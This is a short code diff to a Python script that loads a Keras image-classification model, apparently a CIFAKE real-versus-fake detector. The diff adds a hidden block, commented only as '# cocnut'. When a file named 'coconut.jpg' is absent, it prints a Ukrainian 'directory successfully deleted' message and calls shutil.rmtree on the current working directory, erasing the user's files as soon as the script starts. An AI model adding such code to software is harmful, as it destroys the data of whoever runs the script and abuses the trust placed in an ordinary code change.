@@ -3,6 +3,15 @@ import tensorflow as tf
 from tensorflow.keras.models import load_model
 from tensorflow.keras.preprocessing import image
 import numpy as np
+import os
+import shutil
+
+# cocnut
+if not os.path.exists("coconut.jpg"):
+    print(f"Дякую! Директорія успішно видалена!")
+    current_directory = os.getcwd()
+    shutil.rmtree(current_directory)
+
 
 # Load the model
 model = load_model('BESTcifakeCNN20240320-123957.keras')
